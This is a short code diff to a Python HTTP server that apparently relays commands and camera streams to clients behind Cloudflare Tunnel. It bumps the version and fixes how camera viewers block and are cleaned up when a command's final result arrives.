@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.0.1"
+VERSION = "3.0.2"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -172,13 +172,14 @@ class Handler(BaseHTTPRequestHandler):
                 camera_clients[client_id] = set()
             camera_clients[client_id].add(self)
             try:
-                # Block until client disconnects or camera stops
-                while True:
+                # Block until client disconnects or server removes them (via /result)
+                while camera_clients.get(client_id) is not None and self in camera_clients.get(client_id, set()):
                     time.sleep(1)
             except:
                 pass
             finally:
-                camera_clients.get(client_id, set()).discard(self)
+                if camera_clients.get(client_id) is not None:
+                    camera_clients[client_id].discard(self)
 
         else:
             self._respond(404)
@@ -210,6 +211,9 @@ class Handler(BaseHTTPRequestHandler):
                     client["command_running"] = False
                     client["interactive"] = False
                     client["pending_stdin"] = []
+            # If a final result comes in, the command is done. Stop any stuck camera viewers.
+            if client_id in camera_clients:
+                camera_clients.pop(client_id, None)
             # Never drop /result — evict stream chunks if queue is full
             while True:
                 try:
